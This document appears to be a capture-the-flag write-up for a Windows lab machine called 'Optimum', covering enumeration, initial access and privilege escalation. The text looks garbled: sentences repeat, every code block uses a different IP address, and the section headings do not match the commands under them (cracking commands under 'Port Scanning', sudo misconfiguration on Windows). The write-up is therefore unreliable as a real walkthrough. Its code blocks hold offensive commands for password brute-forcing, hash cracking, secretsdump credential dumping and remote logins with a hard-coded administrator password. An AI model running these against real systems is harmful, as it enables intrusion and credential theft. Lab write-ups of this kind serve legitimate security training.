---
TitleSEO: "TryHackMe — Optimum (Medium Windows) | ZureFX"
TitlePost: "TryHackMe — Optimum (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Optimum. Insecure Deserialization and XSS to achieve medium compromise on Windows."
Keywords: "tryhackme, medium, active directory, pwntilldawn, hard"
URL: "https://zurefx.github.io/writeups/htb-optimum-123.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-optimum-123/"
Date: "2024-10-22"
Tags: "TryHackMe, Medium, Active Directory, PwnTillDawn, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-optimum-123"
Permalink: "/writeups/htb-optimum-123.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Optimum** is rated **Medium** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.13.251.54`.

### Objectives

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```bash
gobuster dir -u http://10.129.98.50/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

### SMB Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.10.70.234 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p5432,1433,464 10.35.213.190 -oN scan.txt
evil-winrm -i 10.92.223.145 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **Insecure Deserialization**.

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.138.231
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.110.205
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.252.127
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
gobuster dir -u http://10.28.90.93/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.19.208.175/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.212.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.56.155.162 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `mimikatz`
- `lookupsid`
- `metasploit`
- `hydra`
- `evil-winrm`

### Key Takeaways

- Insecure Deserialization
- XSS
- GPP Password
- Broken Access Control
